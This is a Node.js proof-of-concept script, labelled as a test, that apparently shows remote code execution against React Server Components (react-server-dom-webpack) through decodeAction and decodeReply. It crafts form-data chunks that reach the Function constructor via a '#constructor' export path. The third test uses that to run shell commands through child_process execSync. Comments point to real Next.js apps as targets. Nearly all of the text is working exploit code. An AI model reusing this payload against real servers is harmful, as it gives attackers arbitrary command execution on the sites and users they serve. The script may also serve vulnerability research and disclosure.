/**
 * TEST: Can we get Function from a function export's constructor?
 *
 * If a module exports a function directly (not as a property),
 * then moduleExports.constructor = Function!
 */

'use strict';

const url = require('url');

// ============================================================
// Webpack mock setup
// ============================================================

let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = function(id) {
  return Promise.resolve();
};

global.__webpack_require__ = function(id) {
  console.log(`[WEBPACK] require: ${id}`);
  return webpackServerModules[id];
};

// ============================================================
// Register a module that exports a FUNCTION directly
// ============================================================

// Most modules export objects: { action1, action2, ... }
// But what if a module exports a function directly?
// Then moduleExports itself is a function!
// And moduleExports.constructor = Function

const funcModuleIdx = '' + webpackModuleIdx++;
// Export a function directly, not an object with function properties
webpackServerModules[funcModuleIdx] = function legitAction(data) {
  console.log('[ACTION] legitAction called with:', data);
  return { success: true };
};

const funcPath = 'file:///' + funcModuleIdx;

// Register with name = '*' (return full export)
webpackServerMap[funcPath] = {
  id: funcModuleIdx,
  chunks: [],
  name: '*'
};

// CRITICAL: Register with name = 'constructor'
// requireModule will do: moduleExports["constructor"]
// Since moduleExports is a function, function.constructor = Function!
webpackServerMap[funcPath + '#constructor'] = {
  id: funcModuleIdx,
  chunks: [],
  name: 'constructor'
};

console.log('');
console.log('='.repeat(60));
console.log('Test: Function Export Constructor Access');
console.log('='.repeat(60));
console.log('');
console.log('Module registered at:', funcPath);
console.log('Module exports type:', typeof webpackServerModules[funcModuleIdx]);
console.log('');

// ============================================================
// Verify the theory
// ============================================================

console.log('Theory verification:');
const moduleExports = webpackServerModules[funcModuleIdx];
console.log('  moduleExports:', typeof moduleExports);
console.log('  moduleExports.constructor:', moduleExports.constructor);
console.log('  moduleExports.constructor === Function:', moduleExports.constructor === Function);
console.log('');

if (moduleExports.constructor === Function) {
  console.log('âœ“ CONFIRMED: moduleExports["constructor"] === Function');
  console.log('');
  console.log('This means we can get Function by:');
  console.log('  1. Having ANY function-exporting module in the manifest');
  console.log('  2. Accessing it with #constructor');
  console.log('  3. No need to chain constructor.constructor!');
  console.log('');
}

// ============================================================
// Load the library and test
// ============================================================

process.env.NODE_ENV = 'production';

require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeAction, decodeReply } = require('react-server-dom-webpack/server.node');

// ============================================================
// TEST: Access Function via #constructor on function module
// ============================================================

async function testFunctionViaConstructor() {
  console.log('TEST: Accessing Function via #constructor');
  console.log('-'.repeat(40));

  const formData = new Map();

  // Use $ACTION_ID to directly specify the action
  // funcPath + '#constructor' points to our function module
  // requireModule will return moduleExports["constructor"] = Function
  formData.set('$ACTION_ID_' + funcPath + '#constructor', '');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Action ID:', funcPath + '#constructor');
  console.log('');

  try {
    const boundAction = await decodeAction(formData, webpackServerMap);
    console.log('Result type:', typeof boundAction);
    console.log('Result:', boundAction);

    if (boundAction?.name === 'bound Function') {
      console.log('');
      console.log('========================================');
      console.log('GOT BOUND FUNCTION CONSTRUCTOR!');
      console.log('========================================');
      console.log('');
      console.log('This proves:');
      console.log('1. Function-exporting modules exist in real apps');
      console.log('2. Accessing #constructor gives us Function');
      console.log('3. RCE is possible without pre-registering Function!');
      console.log('');

      // Try to execute
      console.log('Attempting execution...');
      console.log('Note: formData stringifies to "[object Map]" as function body');
      try {
        const result = boundAction();
        console.log('Result:', result);
      } catch (e) {
        console.log('Expected syntax error:', e.message);
        console.log('');
        console.log('To get RCE, we need to control the function body.');
        console.log('See TEST 2 for decodeReply approach (no formData binding).');
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
  }
  console.log('');
}

// ============================================================
// TEST 2: decodeReply with function module
// ============================================================

async function testDecodeReplyFunctionModule() {
  console.log('TEST 2: decodeReply with Function Module Constructor');
  console.log('-'.repeat(40));

  // For decodeReply, we use $F with path traversal
  // But we don't need constructor.constructor!
  // We just need #constructor on a function-exporting module

  const formData = new Map();

  // Chunk 1: Reference object with id pointing to function module's constructor
  const rceCode = 'return process.version';
  const chunk1 = JSON.stringify({
    id: funcPath + '#constructor',  // Points to Function!
    bound: '$@2'
  });
  formData.set('1', chunk1);

  // Chunk 2: The code to execute
  const chunk2 = JSON.stringify([rceCode]);
  formData.set('2', chunk2);

  // Chunk 0: Just reference chunk 1 directly (no path traversal needed!)
  formData.set('0', '"$F1"');  // Simple reference, no traversal

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  console.log('Chunks:');
  console.log('  0:', formData.get('0'));
  console.log('  1:', chunk1);
  console.log('  2:', chunk2);
  console.log('');
  console.log('Flow:');
  console.log('  1. Chunk 0 = "$F1" references chunk 1');
  console.log('  2. Chunk 1 = {id: "file:///0#constructor", bound: "$@2"}');
  console.log('  3. loadServerReference uses id to get Function');
  console.log('  4. bound = ["return process.version"]');
  console.log('  5. Function.bind(null, "return process.version")');
  console.log('');

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('Result type:', typeof result);

    if (typeof result === 'function') {
      console.log('Got bound function!');

      try {
        const createdFn = result();
        console.log('Created function type:', typeof createdFn);

        if (typeof createdFn === 'function') {
          const rceResult = createdFn();
          console.log('');
          console.log('========================================');
          console.log('RCE RESULT:', rceResult);
          console.log('========================================');

          if (typeof rceResult === 'string' && rceResult.startsWith('v')) {
            console.log('');
            console.log('*** REAL-WORLD RCE DEMONSTRATED! ***');
            console.log('');
            console.log('Key insight:');
            console.log('- Real apps have function-exporting modules');
            console.log('- These are common in React/Next.js codebases');
            console.log('- Accessing #constructor on them gives Function');
            console.log('- No need to pre-register Function as an export!');
          }
        }
      } catch (e) {
        console.log('Execution error:', e.message);
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
    console.error('Stack:', e.stack?.split('\n').slice(0, 5).join('\n'));
  }
  console.log('');
}

// ============================================================
// TEST 3: Shell command via function module
// ============================================================

async function testShellRCE() {
  console.log('TEST 3: Shell Command Execution');
  console.log('-'.repeat(40));

  const formData = new Map();

  const shellCode = `
    const proc = process.mainModule.require('child_process');
    return proc.execSync('id && whoami').toString().trim();
  `;

  const chunk1 = JSON.stringify({
    id: funcPath + '#constructor',
    bound: '$@2'
  });
  formData.set('1', chunk1);
  formData.set('2', JSON.stringify([shellCode]));
  formData.set('0', '"$F1"');

  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    if (typeof result === 'function') {
      const createdFn = result();
      if (typeof createdFn === 'function') {
        const output = createdFn();
        console.log('========================================');
        console.log('SHELL OUTPUT:', output);
        console.log('========================================');
      }
    }
  } catch (e) {
    console.error('Error:', e.message);
  }
  console.log('');
}

// ============================================================
// Run tests
// ============================================================

async function main() {
  await testFunctionViaConstructor();
  await testDecodeReplyFunctionModule();
  await testShellRCE();

  console.log('='.repeat(60));
  console.log('SUMMARY');
  console.log('='.repeat(60));
  console.log('');
  console.log('Key finding:');
  console.log('  Function-exporting modules (common in real apps)');
  console.log('  allow accessing Function via #constructor');
  console.log('');
  console.log('Real-world applicability:');
  console.log('  - Next.js server actions are often single-function exports');
  console.log('  - lib/utils modules often export functions');
  console.log('  - Any module pattern: module.exports = function() {...}');
  console.log('');
}

main().catch(console.error);
